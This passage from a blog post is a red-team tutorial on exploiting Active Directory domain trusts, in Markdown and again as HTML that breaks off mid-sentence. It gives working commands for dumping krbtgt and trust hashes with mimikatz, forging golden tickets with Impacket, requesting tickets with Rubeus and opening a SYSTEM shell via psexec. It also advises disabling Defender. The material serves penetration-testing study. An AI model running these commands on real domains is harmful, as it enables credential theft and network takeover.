what they mean in the main - domain objects are any asset in a domain that serves a purpose. This can include users, services, machines, user properties; almost anything you can think of.\n* **KDC**: The KDC (Key Distribution Center) is the architecture at the center of Kerberos. When a domain object is requesting access to a resource, the KDC will grant it either a TGT (for login) or a TGS (for login to a service).\n* **Domain Dominance**: You'll probably hear this come up a lot in this post, it's essentially red-team terminology for compromising domains and using that domains privileges to compromise another (to however many domains is needed for the compromising procedure).\n* **SIDs**: These are essentially principal names that give domain objects their level of authority. They are denoted as long strings of text that start with `S-1-5`, and can vary based on the domain object. (For example, an Administrator's SID can be `S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX-500`, where `500` represents their privilege level.)\n* **Child/Parent Domains**: You'll see me reference these two terms often. One domain is considered the parent domain (to which is allowed traffic towards the child domain) and the other is considered the child domain (to which the parent domain is allowing inbound traffic towards.)\n* **Bidirectional Trusts**: (Also called two-way trusts) This stems off of Child/Parent domains, in which both domains are considered the Parent and the Child. This is due to both domains trusting one another.\n* **Transitivity**: This essentially is a chain of trusts amongst domains. If Domain/Forest A trusts Domain/Forest B, and Domain/Forest B trusts Domain/Forest C, then that means that A also trusts C. Dependent on the owner of the domains, there can be various other properties that belong to this chain of trusts. \n\nFrom a non-technical level, domain trusts are essentially rulesets that allows one domain to authenticate and access certain resources in a different domain. This essentially works by allowing the traffic for authentication to flow between both domains. This involves utilizing the KDC to authorize the domain object access to the specific domain in question.\n\nThese trusts can either be `one-way` or `bidirectional`. Dependent on which domain is the trusting domain and which domain is the trusted domain, these one-way trusts can be labelled as `Inbound` or `Outbound`. This of course is in relation to the trusted domain that is able to access the trusting domains resources.\n\n![](/images/research/domain-trusts/b.jpg)\n\nIf a trust is `bidirectional` then that means that both domains trust one another - and both domains can access the resources of one another.\n\nFor forests, this works essentially the same way. If Forest A trusts on another Forest B, then Forest B will be able to access resources on Forest A (but not the other way around if it is a one-way trust!).\n\nTo bounce off of the topic of `transitivity` as we discussed earlier, domains/forests can be transitive or non-transitive. With a transitive entity, that same chain that I explained earlier (and in the image below) has transitivity enabled and multiple trusts can consist within that chain even if they aren't directly related to one-another. However, if a domain trust is `non-transitive`, then this chain of trusts does not exist and each domain only has trust rights to the domain that they are delegated to.\n\n![](/images/research/domain-trusts/c.jpg)\n\nThe image above entails a transitive domain trust, meaning that despite Domain A having a trust only on Domain B, that also means that it has a trust on Domain C since Domain B has a trust on Domain C.\n\nIn most cases, attackers exploit domain trusts by utilizing Kerberos. You may have heard of Kerberos terms such as `Silver`, `Golden`, or even `Diamond` tickets. I'll give a short outline to what we can do with these types of tickets, however I'd like to leave domain dominance to its own separate post at a later date.\n\n* **Silver Tickets**: A forged Kerberos service ticket that can be used to impersonate a computer account. These computer accounts are relative to services such as `MSSQL` or `IIS`.\n* **Golden Tickets**: A forged Kerberos service ticket that can be used to impersonate any user within the confines of the machine within the domain.\n* **Diamond Tickets**: Much similar to a golden ticket, except for the fact that the legitimate ticket that is issued is modified, and any TGS-REQs will have the relative AS-REQ before the request field.\n\nFor our specific case below, we'll be looking at different domain trusts and creating a `Golden` ticket for our study, as that's all we'll need. This can be leveraged by tools such as `mimikatz` or `Impacket`.\n\nNote that the environments that you'll see in the examples to follow are not real domains or environments to be awareness, and I do not own them in any capacity. I am merely providing these as examples as to what you might see in an environment.\n# Domain Trust Enumeration\n\nGenerally speaking, one of the common methods I've found to enumerating a domain trust is by utilizing `PowerView`. From a red-team aspect, the `PowerView` module can be picked up by your standard anti-virus whether that be AVs such as Defender or McAfee. It's essentially used to import modules into `PowerShell` that allow for further enumeration of domain objects in a domain, such as `groups`, `computers`, even `delegation` vulnerabilities.\n\nI've referenced the GitHub repository where you can find the script [here](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1). It's a part of the larger `PowerSploit` module, which is used for broad pen-testing tasks and can helpful in a variety of situations. If you're testing this locally, make sure to disable Windows Defender or create an exception for the `PowerView` script.\n\nNote that these examples I will be providing assume that we already have control over a domain denoted as `dan-feliciano.dev`. These \n\nTo enumerate domain trusts, we can use one of the modules present in `PowerSploit` to get the current domain trust present on the system we have access to.\n\n```\nPS C:\\Users\\daz\\Documents> Import-Module .\\PowerView.ps1\n\nPS C:\\Users\\daz\\Documents> Get-DomainTrust\n\nSourceName      : dan-feliciano.dev\nTargetName      : dan-feliciano.pro\nTrustType       : WINDOWS_ACTIVE_DIRECTORY\nTrustAttributes : \nTrustDirection  : Inbound\nWhenCreated     : 5/9/2024 6:25:43 PM\nWhenChanged     : 5/9/2024 6:38:25 PM\n```\n\nDue to the trust being inbound, this indicates to us that we have the authorization to grant domain objects access to the target domain `dan-feliciano.pro`. With this in mind, we can also begin to enumerate the domain through the trust using a different `PowerView` cmdlet.\n\nJust as a helpful tip to remember how this works - `dan-feliciano.dev` is the source of this trust, meaning that the trust direction is towards us. To reference this in a simpler sense, let says `dan-feliciano.dev` is Domain A and `dan-feliciano.pro` is Domain B. In our example, the trust direction is inbound from Domain B to Domain A, meaning (as Domain A) we have access to the resources in Domain B. Don't get confused with the `Inbound` entry in the domain trust output, as that is relative to the TRUST, not the ACCESS.\n\n```\nPS C:\\Users\\daz\\Documents> Get-DomainComputer -Domain dan-feliciano.pro -Properties DnsHostName\n\ndnshostname\n-----------      \ndc.dan-feliciano.pro\nfinance.dan-feliciano.pro\ndb.dan-feliciano.pro\ncorp.dan-feliciano.pro\nkiosk.dan-feliciano.pro\n```\n\nThis now tells us every workstation that is present within the domain, along with their DNS name. The process from here is trivial, dependent on what you would need to compromise for your red teaming procedure. In some cases, we may want to get access to the low-level `kiosk`, and in others we may want to look at the domain controller denoted as `dc.dan-feliciano.pro`.\n\nFrom here your attack can vary based on the trust that is present between the two domains. I'll go over all three different variants of these trusts and how to exploit them effectively.\n\n# Exploiting Inbound Trusts\n\nAs a preliminary example, let's assume that we're utilizing the same trust from the last section. This means that `dan-feliciano.dev` has a one-way inbound trust with the foreign domain `dan-feliciano.pro`.\n\nWe can exploit this using a few Impacket tools which are present by default on the latest versions of Kali Linux, so we'll use those to start. However we'll need a few assets in order to do this:\n\n* The `NTLM` hash of the `krbtgt` domain object on our current domain, `dan-feliciano.dev`.\n* The `dan-feliciano.dev` domain object SID.\n* The `dan-feliciano.pro` domain object SID.\n\nAs explained previously, the objects in our domain can be given access to any of the resources that are present in `dan-feliciano.pro`. We can start by getting the assets above and by enumerating a few of the objects on the remote domain such as the `Enterprise Admins` foreign group.\n\nTo start, we can grab both the `NTLM` hash and the `dan-feliciano.dev` domain SID by using `mimikatz` on the domain that we already control. If you haven't used `mimikatz` before, it's an extremely helpful tool used to dump domain information from registry in the post-exploitation phase of your red-teaming procedure. You can find the link to `mimikatz` in this GitHub repo [here](https://github.com/ParrotSec/mimikatz).\n\n```\nPS C:\\Users\\daz\\Documents> .\\mimikatz.exe \"privilege::debug\" \"lsadump::lsa /user:krbtgt /patch\" \"exit\"\n```\n\nThis output from `mimikatz` should give us both the NTLM hash of the `krbtgt` user along with the domain SID, to which I'll include in a list to prevent clutter.\n* `krbtgt` NTLM hash - `b84a08b41bd7e5e7f3708d0166d61bb1`\n* `DAZ - dan-feliciano.dev` domain SID - `S-1-5-21-878395754-674829726-1647362892`\n\nNext, we'll use another `PowerView` cmdlet that allows us to view the `Enterprise Admins` group amongst the foreign domain and all it's relative properties. The object that we're looking at is the `MemberName` entry, which should contain the respective SID that we're looking for.\n\n```\nPS C:\\Users\\daz\\Documents> Get-DomainForeignGroupMember -Domain dan-feliciano.pro\n\nGroupDomain             : dan-feliciano.pro\nGroupName               : Enterprise Admins\nGroupDistinguishedName  : CN=Enterprise,CN=Admins,CN=Builtin,DC=daz,DC=pro\nMemberDomain            : dan-feliciano.pro\nMemberName              : S-1-5-21-492758473-538291874-1904739281-519\nMemberDistinguishedName : CN=S-1-5-21-492758473-538291874-1904739281-519,CN=ForeignSecurityPrincipals,DC=daz,DC=pro\n```\n\nNow that we have all the information, we can progress with our exploit.\n\n```\ndaz@daz$ impacket-ticketer -nthash b84a08b41bd7e5e7f3708d0166d61bb1 -domain-sid S-1-5-21-878395754-674829726-1647362892 -extra-sid S-1-5-21-492758473-538291874-1904739281-519 -domain (trusting_domain) Administrator\n```\n\nThis will create an `Administrator.ccache` file in the directory that we are currently present in. This is a credential cache, which holds the credentials of the Kerberos ticket that we just crafted. Since this is specifically a golden ticket we created, we can use this as our authentication point to access the other domain.\n\nSince we're using Kerberos authentication, we'll also need to set the `KRB5CCNAME` global variable on Kali Linux to point to the `ccache` file we just created.\n\n```\ndaz@daz$ export KRB5CCNAME=Administrator.ccache\n```\n\nFinally, we'll need to run `PsExec` to establish a remote session to the workstation that we'd like to authenticate to. In our case, we're looking to authenticate as the `Administrator` user using the full FQDN of the machine. Remember to add the IP addresses and all the domain names you'll need in your `/etc/hosts` file.\n\n```\ndaz@daz$ impacket-psexec dan-feliciano.dev/Administrator@dc.dan-feliciano.pro -k -no-pass -target-ip (IP address of dc.dan-feliciano.pro)\n```\n\nAnd that should be all you'll need. A remote shell session should be established through `PsExec`, which will do all the needful and open a reverse shell for you. From my experience, this creates a session as `SYSTEM`, which is the highest-authoritative account you have access to on a workstation. From here, we can dump all the hashes and pivot to other workstations if we need to - or potentially compromise another domain!\n\n# Exploiting Outbound Trusts\n\nOutbound trusts work a little different, as the traffic is flowing in a different direction. In the last example, `dan-feliciano.dev` trusted `dan-feliciano.pro`, however what if this was an outbound trust?\n\n```\nPS C:\\Users\\daz\\Documents> Import-Module .\\PowerView.ps1\n\nPS C:\\Users\\daz\\Documents> Get-DomainTrust\n\nSourceName      : dan-feliciano.dev\nTargetName      : dan-feliciano.pro\nTrustType       : WINDOWS_ACTIVE_DIRECTORY\nTrustAttributes : \nTrustDirection  : Outbound\nWhenCreated     : 5/9/2024 9:46:13 PM\nWhenChanged     : 5/9/2024 9:52:58 PM\n```\n\nRemember, now that this is an outbound trust, `dan-feliciano.dev` is the domain that is trusting `dan-feliciano.pro`. This means that `dan-feliciano.pro` can access the resources on `dan-feliciano.dev`. The issue with this, is that we are in control of the trusting domain in this case, and we shouldn't be able to gain access to the trusted domain.\n\nDespite this, there are still ways to exploit this. Within a domain trust, there is a shared password that is automatically set to expire once every 30 days). This password is stored within a TDO, or Trusted Domain Object. Our main point of exploitation is the TDO, as these are stored within the `SYSTEM` machine that we currently have access to.\n\nWe can dump the keys used for the TDO using `mimikatz` on the domain controller, however we'll also need to find the GUID of the TDO which we currently have the ability to enumerate.\n\n```\nPS C:\\Users\\daz\\Documents> Get-DomainObject -Identity \"CN=dan-feliciano.pro,CN=System,DC=dan-feliciano,DC=dev\" | Select ObjectGuid\n\nobjectguid                          \n----------\nf5ksj19d-72rt-81lt-92d5-92jd27c109p2\n```\n\nNow that we have the GUID, we can dump the TDO using `mimikatz` and by performing a `dcsync`. What a DCSync will do in our case is have `mimikatz` act like a domain controller and dump all the credentials that it has access to on the current domain. Since we are supplying the GUID of the TDO, we can dump the respect `AES256`, `AES128`, and `RC4` hashes to the TDO.\n\n```\nPS C:\\Users\\daz\\Documents> .\\mimikatz.exe \"privilege::debug\" \"lsadump::dcsync /domain:dan-feliciano.dev /guid:{f5ksj19d-72rt-81lt-92d5-92jd27c109p2}\" \"exit\"\n\n[DC] 'dan-feliciano.dev' will be the domain\n[DC] 'dc.dan-feliciano.dev' will be the DC server\n[DC] Object with GUID '{f5ksj19d-72rt-81lt-92d5-92jd27c109p2}'\n[rpc] Service  : ldap\n[rpc] AuthnSvc : GSS_NEGOTIATE (9)\n\nObject RDN           : dan-feliciano.pro\n\n** TRUSTED DOMAIN - Antisocial **\n\nPartner              : dan-feliciano.pro\n [ Out ] DAN-FELICIANO.PRO -> DAN-FELICIANO.DEV\n    * 5/9/2024 9:46:13 PM - CLEAR   - 58 0d 24 aa 1f f8 07 2c 2a d4 a8 cc 68 93 6e 20 5f ad 3b 32 e0 51 8e cc f0\n\t* aes256_hmac       1. b48fcf2e5e6cf31e6ee73d35e1409aa0a903c44c514e024d6a2a30701ec6\n\t* aes128_hmac       b48fcf2e5e6cf31e6ee73d35e1409aa0\n\t* rc4_hmac_nt       e1087fb17c8e5b4f29c4e1c0cb161481\n\n [Out-1] DAN-FELICIANO.PRO -> DAN-FELICIANO.DEV\n    * 5/9/2024 9:46:13 PM - CLEAR   - 58 0d 24 aa 1f f8 07 2c 2a d4 a8 cc 68 93 6e 20 5f ad 3b 32 e0 51 8e cc f0\n\t* aes256_hmac       b48fcf2e5e6cf31e6ee73d35e1409aa0a903c44c514e024d6a2a30701ec6\n\t* aes128_hmac       b48fcf2e5e6cf31e6ee73d35e1409aa0\n\t* rc4_hmac_nt       e1087fb17c8e5b4f29c4e1c0cb161481\n\n```\n\nIn this output, we see two passwords in their `AES256`, `AES128`, `RC4` values. We're focused on the primary `[Out]` key and not the `[Out-1]` key, however it isn't an issue in our situation because it hasn't been 30 days since the creation of this trust. If 30 days were to pass since this point, then the passwords for both `[Out]` and `[Out-1]` might be different.\n\nWhat makes these types of hashes so dangerous to use is that we can use them for Pass-the-Hash methods into Kerberos for a multitude of different use cases. You'll see that in the next part of the process, we'll use it to impersonate a user and interact with the domain however we'd like.\n\nThat being said, we have the hash for the TDO, but what user does it belong to? In our scenario, there are users called \"trust users\", which are essentially trusted accounts that have the ability to access resources over the domain trust. While the domain trust is outbound, the trusted domain still requires a trust user to use in order to properly access our domain's resources. This same trust user is present on the trusted domain, which we now have a hash for. We can discover valid trust users with another `PowerView` cmdlet, you can find an example of what you might see below.\n\n```\nPS C:\\Users\\daz\\Documents> Get-DomainUser -Identity * -Properties DisplayName, MemberOf | fl\n\ndisplayname : DAN\nmemberof    : {CN=Pro Users,CN=Users,DC=dan-feliciano,DC=pro}\n```\n\n* You can also use tools such as `ADSearch --search \"(objectCategory=user)\"` to discover valid machine accounts. Just for simplicities sake, we'll stick with `PowerView`.\n\nThis essentially tells us that there could be a valid trust account named `DAN$` amongst the `dan-feliciano.pro` domain.  Although we aren't able to confirm this since we can't access the any domain resources in the trusted domain, we can still attempt to try and determine if this is the right account. This is what makes this process semi-trivial, as we're essentially guessing whether or not this is a valid trust account.\n\nWe can use a tool called `Rubeus` to create a valid service ticket for the `DAN$` account. Rubeus is toolset that is used for Kerberos interaction and exploits, and it will assist in us being able to create TGTs and TGSs that we'll need in order to access the foreign domain.\n\n```\nPS C:\\Users\\daz\\Documents> .\\Rubeus.exe asktgt /user:DAN$ /domain:dan-feliciano.pro /rc4:e1087fb17c8e5b4f29c4e1c0cb161481 /nowrap\n\n[*] Action: Ask TGT\n\n[*] Using rc4_hmac hash: e1087fb17c8e5b4f29c4e1c0cb161481\n[*] Building AS-REQ (w/ preauth) for: 'dan-feliciano.pro\\DAN$'\n[*] Using domain controller: (DOMAIN CONTROLLER IP)\n[+] TGT request successful!\n[*] base64(ticket.kirbi):\n\n\t\tdoIHrK[...snip...]Yit98s\n```\n\nThis will return a TGT that we can now use on the remote domain, which can be used in a variety of situations. You can enumerate potential vectors with this TGT with tools such as `PowerSploit` or `ADSearch`. In some situations, we may be dealing with attacks such as constrained/unconstrained delegation, Kerberoasting, ASREPRoasting, or even ADCS. I look forward to creating future posts regarding these exploits in the future.\n\n# Bidirectional Trusts\n\nI don't plan on going specifically into an attack vector for `bidirectional` trust attacks, since you can essentially perform either of the trust attacks that were listed for inbound/outbound as explained above. I do however want to explain a few of the methods that can be used for this.\n\n```\nPS C:\\Users\\daz\\Documents> Import-Module .\\PowerView.ps1\n\nPS C:\\Users\\daz\\Documents> Get-DomainTrust\n\nSourceName      : dan-feliciano.dev\nTargetName      : dan-feliciano.pro\nTrustType       : WINDOWS_ACTIVE_DIRECTORY\nTrustAttributes : \nTrustDirection  : Bidirectional\nWhenCreated     : 5/9/2024 10:28:52 PM\nWhenChanged     : 5/9/2024 10:28:52 PM\n```\n\nEssentially this will tell us that both domains trust one another, and that both domains have access to each other's resources. We can perform a variety of attacks as explained above, or we can create `Golden` or `Diamond` tickets used to access each of the domains.\n\nIf we are a domain admin or have DA privileges in the child domain, this tells us that we also have DA privileges in the parent domain. This is through the idea of SID History, which (at a basic-level) causes the domains to share SIDs amongst the domain trust. The SID of the DA account we have access to will be inherited in the parent domain due to the bidirectional relationship.\n\nThat's essentially where `Golden` and `Diamond` tickets come into play, however I plan on leaving those for another post as I explained earlier. Domain dominance is a really interesting topic, and I am looking forward to researching more into it.\n\n# Conclusion\n\nBig thanks to RastaMouse and r0bit for getting me into this given the material that I've learned from. I encourage you all to progress through machines and chains on `Vulnlab`, as they really help with understanding Active Directory and Linux exploits; as well as just general red-team thinking.\n\n**Resources Used**\n\n* https://learn.microsoft.com/en-us/entra/identity/domain-services/concepts-forest-trust\n* https://harmj0y.medium.com/a-guide-to-attacking-domain-trusts-ef5f8992bb9d\n* https://www.ibm.com/docs/en/db2/11.5?topic=windows-trust-relationships-between-domains\n* https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets\n* https://www.youtube.com/playlist?list=PLQbhlCtfsL39XMbLjmuu06hc1CIJsfuZ-*\n\n\n\n","slug":"domain-trusts","published":1,"updated":"2024-06-06T02:41:59.032Z","_id":"clx2nhkel000069ufcm3yhlor","comments":1,"layout":"post","photos":[],"content":"<p>I took inspiration from researching this topic from one of the recent machines that I wrote a writeup for, which you can find <a href=\"https://dan-feliciano.com/writeups/trusted/\">here</a> (you can probably get the interpretation from the name of the chain). The topic that I wanted to delve into today was the idea of Domain and Forest Trusts in an Active Directory environment. I tried getting a little creative with Lucidchart, as you’ll see in the images to follow.</p>\n<p>I’ll list a few topics that you’ll need to understand before we delve into domain and forest trusts, as it just helps with practice to know what these mean.</p>\n<ul>\n<li><strong>Domain Objects</strong>: These are essentially exactly what they mean in the main - domain objects are any asset in a domain that serves a purpose. This can include users, services, machines, user properties; almost anything you can think of.</li>\n<li><strong>KDC</strong>: The KDC (Key Distribution Center) is the architecture at the center of Kerberos. When a domain object is requesting access to a resource, the KDC will grant it either a TGT (for login) or a TGS (for login to a service).</li>\n<li><strong>Domain Dominance</strong>: You’ll probably hear this come up a lot in this post, it’s essentially red-team terminology for compromising domains and using that domains privileges to compromise another (to however many domains is needed for the compromising procedure).</li>\n<li><strong>SIDs</strong>: These are essentially principal names that give domain objects their level of authority. They are denoted as long strings of text that start with <code>S-1-5</code>, and can vary based on the domain object. (For example, an Administrator’s SID can be <code>S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX-500</code>, where <code>500</code> represents their privilege level.)</li>\n<li><strong>Child&#x2F;Parent Domains</strong>: You’ll see me reference these two terms often. One domain is considered the parent domain (to which is allowed traffic towards the child domain) and the other is considered the child domain (to which the parent domain is allowing inbound traffic towards.)</li>\n<li><strong>Bidirectional Trusts</strong>: (Also called two-way trusts) This stems off of Child&#x2F;Parent domains, in which both domains are considered the Parent and the Child. This is due to both domains trusting one another.</li>\n<li><strong>Transitivity</strong>: This essentially is a chain of trusts amongst domains. If Domain&#x2F;Forest A trusts Domain&#x2F;Forest B, and Domain&#x2F;Forest B trusts Domain&#x2F;Forest C, then that means that A also trusts C. Dependent on the owner of the domains, there can be various other properties that belong to this chain of trusts.</li>\n</ul>\n<p>From a non-technical level, domain trusts are essentially rulesets that allows one domain to authenticate and access certain resources in a different domain. This essentially works by allowing the traffic for authentication to flow between both domains. This involves utilizing the KDC to authorize the domain object access to the specific domain in question.</p>\n<p>These trusts can either be <code>one-way</code> or <code>bidirectional</code>. Dependent on which domain is the trusting domain and which domain is the trusted domain, these one-way trusts can be labelled as <code>Inbound</code> or <code>Outbound</code>. This of course is in relation to the trusted domain that is able to access the trusting domains resources.</p>\n<p><img src=\"/images/research/domain-trusts/b.jpg\"></p>\n<p>If a trust is <code>bidirectional</code> then that means that both domains trust one another - and both domains can access the resources of one another.</p>\n<p>For forests, this works essentially the same way. If Forest A trusts on another Forest B, then Forest B will be able to access resources on Forest A (but not the other way around if it is a one-way trust!).</p>\n<p>To bounce off of the topic of <code>transitivity</code> as we discussed earlier, domains&#x2F;forests can be transitive or non-transitive. With a transitive entity, that same chain that I explained earlier (and in the image below) has transitivity enabled and multiple trusts can consist within that chain even if they aren’t directly related to one-another. However, if a domain trust is <code>non-transitive</code>, then this chain of trusts does not exist and each domain only has trust rights to the domain that they are delegated to.</p>\n<p><img src=\"/images/research/domain-trusts/c.jpg\"></p>\n<p>The image above entails a transitive domain trust, meaning that despite Domain A having a trust only on Domain B, that also means that it has a trust on Domain C since Domain B has a trust on Domain C.</p>\n<p>In most cases, attackers exploit domain trusts by utilizing Kerberos. You may have heard of Kerberos terms such as <code>Silver</code>, <code>Golden</code>, or even <code>Diamond</code> tickets. I’ll give a short outline to what we can do with these types of tickets, however I’d like to leave domain dominance to its own separate post at a later date.</p>\n<ul>\n<li><strong>Silver Tickets</strong>: A forged Kerberos service ticket that can be used to impersonate a computer account. These computer accounts are relative to services such as <code>MSSQL</code> or <code>IIS</code>.</li>\n<li><strong>Golden Tickets</strong>: A forged Kerberos service ticket that can be used to impersonate any user within the confines of the machine within the domain.</li>\n<li><strong>Diamond Tickets</strong>: Much similar to a golden ticket, except for the fact that the legitimate ticket that is issued is modified, and any TGS-REQs will have the relative AS-REQ before the request field.</li>\n</ul>\n<p>For our specific case below, we’ll be looking at different domain trusts and creating a <code>Golden</code> ticket for our study, as that’s all we’ll need. This can be leveraged by tools such as <code>mimikatz</code> or <code>Impacket</code>.</p>\n<p>Note that the environments that you’ll see in the examples to follow are not real domains or environments to be awareness, and I do not own them in any capacity. I am merely providing these as examples as to what you might see in an environment.</p>\n<h1 id=\"Domain-Trust-Enumeration\"><a href=\"#Domain-Trust-Enumeration\" class=\"headerlink\" title=\"Domain Trust Enumeration\"></a>Domain Trust Enumeration</h1><p>Generally speaking, one of the common methods I’ve found to enumerating a domain trust is by utilizing <code>PowerView</code>. From a red-team aspect, the <code>PowerView</code> module can be picked up by your standard anti-virus whether that be AVs such as Defender or McAfee. It’s essentially used to import modules into <code>PowerShell</code> that allow for further enumeration of domain objects in a domain, such as <code>groups</code>, <code>computers</code>, even <code>delegation</code> vulnerabilities.</p>\n<p>I’ve referenced the GitHub repository where you can find the script <a href=\"https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1\">here</a>. It’s a part of the larger <code>PowerSploit</code> module, which is used for broad pen-testing tasks and can helpful in a variety of situations. If you’re testing this locally, make sure to disable Windows Defender or create an exception for the <code>PowerView</code> script.</p>\n<p>Note that these examples I will be providing assume that we already have control over a domain denoted as <code>dan-feliciano.dev</code>. These </p>\n<p>To enumerate domain trusts, we can use one of the modules present in <code>PowerSploit</code> to get the current domain trust present on the system we have access to.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Users\\daz\\Documents&gt; Import-Module .\\PowerView.ps1</span><br><span class=\"line\"></span><br><span class=\"line\">PS C:\\Users\\daz\\Documents&gt; Get-DomainTrust</span><br><span class=\"line\"></span><br><span class=\"line\">SourceName      : dan-feliciano.dev</span><br><span class=\"line\">TargetName      : dan-feliciano.pro</span><br><span class=\"line\">TrustType       : WINDOWS_ACTIVE_DIRECTORY</span><br><span class=\"line\">TrustAttributes : </span><br><span class=\"line\">TrustDirection  : Inbound</span><br><span class=\"line\">WhenCreated     : 5/9/2024 6:25:43 PM</span><br><span class=\"line\">WhenChanged     : 5/9/2024 6:38:25 PM</span><br></pre></td></tr></table></figure>\n\n<p>Due to the trust being inbound, this indicates to us that we have the authorization to grant domain objects access to the target domain <code>dan-feliciano.pro</code>. With this in mind, we can also begin to enumerate the domain through the trust using a different <code>PowerView</code> cmdlet.</p>\n<p>Just as a helpful tip to remember how this works - <code>dan-feliciano.dev</code> is the source of this trust, meaning that the trust direction is towards us. To reference this in a simpler sense, let says <code>dan-feliciano.dev</code> is Domain A and <code>dan-feliciano.pro</code> is Domain B. In our example, the trust direction is inbound from Domain B to Domain A, meaning (as Domain A) we have access to the resources in Domain B. Don’t get confused with the <code>Inbound</code> entry in the domain trust output, as that is relative to the TRUST, not the ACCESS.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Users\\daz\\Documents&gt; Get-DomainComputer -Domain dan-feliciano.pro -Properties DnsHostName</span><br><span class=\"line\"></span><br><span class=\"line\">dnshostname</span><br><span class=\"line\">-----------      </span><br><span class=\"line\">dc.dan-feliciano.pro</span><br><span class=\"line\">finance.dan-feliciano.pro</span><br><span class=\"line\">db.dan-feliciano.pro</span><br><span class=\"line\">corp.dan-feliciano.pro</span><br><span class=\"line\">kiosk.dan-feliciano.pro</span><br></pre></td></tr></table></figure>\n\n<p>This now tells us every workstation that is present within the domain, along with their DNS name. The process from here is trivial, dependent on what you would need to compromise for your red teaming procedure. In some cases, we may want to get access to the low-level <code>kiosk</code>, and in others we may want to look at the domain controller denoted as <code>dc.dan-feliciano.pro</code>.</p>\n<p>From here your attack can vary based on the trust that is present between the two domains. I’ll go over all three different variants of these trusts and how to exploit them effectively.</p>\n<h1 id=\"Exploiting-Inbound-Trusts\"><a href=\"#Exploiting-Inbound-Trusts\" class=\"headerlink\" title=\"Exploiting Inbound Trusts\"></a>Exploiting Inbound Trusts</h1><p>As a preliminary example, let’s assume that we’re utilizing the same trust from the last section. This means that <code>dan-feliciano.dev</code> has a one-way inbound trust with the foreign domain <code>dan-feliciano.pro</code>.</p>\n<p>We can exploit this using a few Impacket tools which are present by default on the latest versions of Kali Linux, so we’ll use those to start. However we’ll need a few assets in order to do this:</p>\n<ul>\n<li>The <code>NTLM</code> hash of the <code>krbtgt</code> domain object on our current domain, <code>dan-feliciano.dev</code>.</li>\n<li>The <code>dan-feliciano.dev</code> domain object SID.</li>\n<li>The <code>dan-feliciano.pro</code> domain object SID.</li>\n</ul>\n<p>As explained previously, the objects in our domain can be given access to any of the resources that are present in <code>dan-feliciano.pro</code>. We can start by getting the assets above and by enumerating a few of the objects on the remote domain such as the <code>Enterprise Admins</code> foreign group.</p>\n<p>To start, we can grab both the <code>NTLM</code> hash and the <code>dan-feliciano.dev</code> domain SID by using <code>mimikatz</code> on the domain that we already control. If you haven’t used <code>mimikatz</code> before, it’s an extremely helpful tool used to dump domain information from registry in the post-exploitation phase of your red-teaming procedure. You can find the link to <code>mimikatz</code> in this GitHub repo <a href=\"https://github.com/ParrotSec/mimikatz\">here</a>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Users\\daz\\Documents&gt; .\\mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::lsa /user:krbtgt /patch&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>\n\n<p>This output from <code>mimikatz</code> should give us both the NTLM hash of the <code>krbtgt</code> user along with the domain SID, to which I’ll include in a list to prevent clutter.</p>\n<ul>\n<li><code>krbtgt</code> NTLM hash - <code>b84a08b41bd7e5e7f3708d0166d61bb1</code></li>\n<li><code>DAZ - dan-feliciano.dev</code> domain SID - <code>S-1-5-21-878395754-674829726-1647362892</code></li>\n</ul>\n<p>Next, we’ll use another <code>PowerView</code> cmdlet that allows us to view the <code>Enterprise Admins</code> group amongst the foreign domain and all it’s relative properties. The object that we’re looking at is the <code>MemberName</code> entry, which should contain the respective SID that we’re looking for.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Users\\daz\\Documents&gt; Get-DomainForeignGroupMember -Domain dan-feliciano.pro</span><br><span class=\"line\"></span><br><span class=\"line\">GroupDomain             : dan-feliciano.pro</span><br><span class=\"line\">GroupName               : Enterprise Admins</span><br><span class=\"line\">GroupDistinguishedName  : CN=Enterprise,CN=Admins,CN=Builtin,DC=daz,DC=pro</span><br><span class=\"line\">MemberDomain            : dan-feliciano.pro</span><br><span class=\"line\">MemberName              : S-1-5-21-492758473-538291874-1904739281-519</span><br><span class=\"line\">MemberDistinguishedName : CN=S-1-5-21-492758473-538291874-1904739281-519,CN=ForeignSecurityPrincipals,DC=daz,DC=pro</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have all the information, we can progress with our exploit.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">daz@daz$ impacket-ticketer -nthash b84a08b41bd7e5e7f3708d0166d61bb1 -domain-sid S-1-5-21-878395754-674829726-1647362892 -extra-sid S-1-5-21-492758473-538291874-1904739281-519 -domain (trusting_domain) Administrator</span><br></pre></td></tr></table></figure>\n\n<p>This will create an <code>Administrator.ccache</code> file in the directory that we are currently present in. This is a credential cache, which holds the credentials of the Kerberos ticket that we just crafted. Since this is specifically a golden ticket we created, we can use this as our authentication point to access the other domain.</p>\n<p>Since we’re using Kerberos authentication, we’ll also need to set the <code>KRB5CCNAME</code> global variable on Kali Linux to point to the <code>ccache</code> file we just created.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">daz@daz$ export KRB5CCNAME=Administrator.ccache</span><br></pre></td></tr></table></figure>\n\n<p>Finally, we’ll need to run <code>PsExec</code> to establish a remote session to the workstation that we’d like to authenticate to. In our case, we’re looking to authenticate as the <code>Administrator</code> user using the full FQDN of the machine. Remember to add the IP addresses and all the domain names you’ll need in your <code>/etc/hosts</code> file.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">daz@daz$ impacket-psexec dan-feliciano.dev/Administrator@dc.dan-feliciano.pro -k -no-pass -target-ip (IP address of dc.dan-feliciano.pro)</span><br></pre></td></tr></table></figure>\n\n<p>And that should be all you’ll need. A remote shell session should be established through <code>PsExec</code>, which will do all the needful and open a reverse shell for you. From my experience, this creates a session as <code>SYSTEM</code>, which is the highest-authoritative account you have access to on a workstation. From here, we can dump all 